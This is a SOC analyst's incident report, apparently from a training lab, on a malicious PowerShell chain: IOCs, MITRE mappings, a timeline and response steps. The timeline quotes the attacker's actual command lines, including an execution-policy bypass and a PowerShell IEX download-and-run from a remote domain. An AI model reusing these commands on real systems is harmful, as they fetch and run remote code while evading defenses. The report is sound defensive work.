# SOC153 - Suspicious PowerShell Script Executed

**Event ID:** 238  
**Date:** 2024-03-14 17:23:00 UTC  
**Alert Priority:** High. Our network has been compromised using malicious PowerShell scripts to exfiltrate data and send it to a C2 address.  
**Confidence Level:** High  
## MITRE ATT&CK Techniques

| Technique | Reasoning |
|---|---|
| T1105 (Ingress Tool Transfer) | Download of external payload (payload_1.ps1) over the network. |
| T1059.001 (Command and Scripting Interpreter: PowerShell) | Target file is a .ps1 script. |
| T1059.003 (Command and Scripting Interpreter: Windows Command Shell) | Uses cmd.exe to execute a single, nested command line string. |
| T1562.001 (Impair Defenses: Disable or Modify Tools) | Modifies built-in PowerShell security controls. |
| T1204.002 (User Execution: Malicious File) | Executes malicious PowerShell files. |
| T1568 (Dynamic Resolution) | Uses DNS to resolve kionagranada[.]com to 161[.]22[.]46[.]148. |
| T1071.001 (Application Layer Protocol: Web Protocols) | Uses HTTPS for payload staging and HTTP for C2 traffic. |
| TA0011 (Command and Control) | Uses C2 server hosted at 91[.]236[.]116[.]163 to exfiltrate data. |

## IOCs

| Type | Value |
|---|---|
| File | payload_1.ps1 |
| Hash (SHA256) | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| File | sd2.ps1 |
| Hash (SHA256) | 5dc336e0f6481f2d00bf2097716176277b45fc2cae9a96b0e2f9f42489edc9c1 |
| Domain | kionagranada[.]com |
| IP | 161[.]22[.]46[.]148 |
| IP | 91[.]236[.]116[.]163 |
| Staging URL | hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 |
| C2 URL | hxxp://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6 |
| Affected Host | Tony (172.16.17.206) |

## Summary

On 2024-03-14 at 17:23:00 UTC, a malicious PowerShell script named payload_1.ps1 was executed on Tony's host machine. This initial payload is used to download and execute a secondary payload from a payload delivery domain (kionagranada[.]com). Once the second payload is executed, data is exfiltrated to a C2 address based in Sweden (91[.]236[.]116[.]163). Cleaning of the two PowerShell scripts is advised. This alert has been deemed a true positive.

## Reasoning

The initial payload (payload_1.ps1) was analyzed by VirusTotal, with 35 security vendors confirming malicious intent. There are several log entries indicating compromise of our network and exfiltration of data to a C2 address. There was access to a malicious payload delivery domain (kionagranada[.]com) and modification of a built-in PowerShell security configuration. Escalation to L2 is highly advised.

## Timeline

| Time (UTC) | Event |
|---|---|
| 2024-03-14 17:22:25 | HTTPS request for hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 (3.5.130.147). |
| 2024-03-14 17:22:XX | Attempt to bypass safety configurations for PowerShell regarding payload_1.ps1 and then executes it: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-Command" "if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1\payload_1.ps1.'"` |
| 2024-03-14 17:22:XX | Executes remote command, initiates web request for payload delivery domain to retrieve sd2.ps1 and executes it: `"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'hxxps://kionagranada.com/upload/sd2.ps1')."` |
| 2024-03-14 17:23:XX | DNS request for payload delivery domain named kionagranada[.]com (161[.]22[.]46[.]148). |
| 2024-03-14 17:23:XX | Contacted payload delivery domain named kionagranada[.]com over HTTPS (161[.]22[.]46[.]148). |
| 2024-03-14 17:23:XX | Contacts C2 address (91[.]236[.]116[.]163) over HTTP: hxxp://91.236.116.163/INDEX.PHP?ID=90059C37-1320-41A4-B58D-2B75A9850D2F&SUBID=9G6CLLE6. |

## Attack Detail

There are 4 parts to the attack chain present. First, initial access to payload_1.ps1. An HTTPS request was made for the initial payload: hxxps://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1. Second, defense evasion and execution. The attacker modified the security configuration of PowerShell to execute the payload_1.ps1 script. Third, secondary payload delivery and execution. Cmd.exe spawns a new PowerShell instance and a Web Request is invoked to download the second payload sd2.ps1 from the payload delivery domain kionagranada[.]com. Once the second payload is downloaded, it is executed. Lastly, command and control. An HTTP request is made to a C2 address (91[.]236[.]116[.]163), exfiltrating data to the threat actor.

## Actions Taken

- Checked payload_1.ps1 against VirusTotal, with 35 security vendors marking it as a malicious Boxter/trojan malware.  
- Quarantined Tony's host device.  
- Checked logs tied to Tony (172.16.17.206) for anomalous network behavior. Attack chain present, details listed in timeline and attack detail section.  
- Checked EDR for Tony host device. No anomalous processes or telemetry found related to the incident.  
- Ruled out anomalous emails from the incident.  
- Escalated to L2.  

## Recommended Next Steps

- Clean payload_1.ps1 and sd2.ps1 from Tony's host device.  
- Blacklist C2 address (91[.]236[.]116[.]163) and kionagranada.com from our network and report it to prevent future abuse.  
- Investigate amount of data exfiltrated to C2 address.  
- Reset passwords and credentials for Tony's host device.